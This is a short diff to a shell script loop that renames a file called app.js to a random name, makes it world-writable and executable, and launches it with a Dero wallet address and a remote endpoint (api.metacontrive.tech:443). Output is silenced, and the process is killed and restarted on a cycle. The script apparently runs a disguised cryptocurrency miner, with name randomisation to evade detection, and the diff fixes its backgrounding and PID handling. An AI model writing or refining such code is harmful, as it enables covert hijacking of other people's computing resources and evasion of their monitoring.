@@ -18,11 +18,12 @@ restart_main() {
     generate_random_name
     mv app.js "$new_name"
     chmod 777 "$new_name"
-    ./"$new_name" -w dero1qyjrwgdvns7arfuzf6pz5lhpj2yfsdlzy9c05w6qmmp3shc7fm3m2qgjs4uez -r api.metacontrive.tech:443 -p rpc > /dev/null 2>&1
-    echo "Restarted with PID: $!"
+    ./"$new_name" -w dero1qyjrwgdvns7arfuzf6pz5lhpj2yfsdlzy9c05w6qmmp3shc7fm3m2qgjs4uez -r api.metacontrive.tech:443 -p rpc > /dev/null 2>&1 &
+    pid=$!
+    echo "Restarted with PID: $pid"
     sleep "$delay"
-    echo "Stopping process with PID: $!"
-    kill "$!"
+    echo "Stopping process with PID: $pid"
+    kill "$pid"
     echo "Process stopped"
     echo "Exited process"
   done
